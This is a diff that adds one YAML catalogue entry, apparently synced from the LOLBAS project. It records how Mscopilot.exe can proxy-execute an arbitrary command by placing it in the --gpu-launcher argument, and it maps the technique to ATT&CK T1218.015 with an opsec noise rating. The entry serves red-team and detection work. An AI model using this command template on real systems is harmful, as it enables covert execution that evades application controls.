@@ -1,0 +1,29 @@
+id: lolbas/mscopilot/execute/0
+type: binary
+platform: windows
+name: Mscopilot.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1218.015
+opsec:
+  noise: high
+commands:
+- template: mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="{CMD} && taskkill
+    /f /im mscopilot.exe &&"
+  comment: '`mscopilot.exe` will spawn the provided command. Parent `mscopilot.exe` process needs to be
+    killed to avoid command being executed an infinite number of times.'
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mscopilot/
+tags:
+- windows
+- lolbas
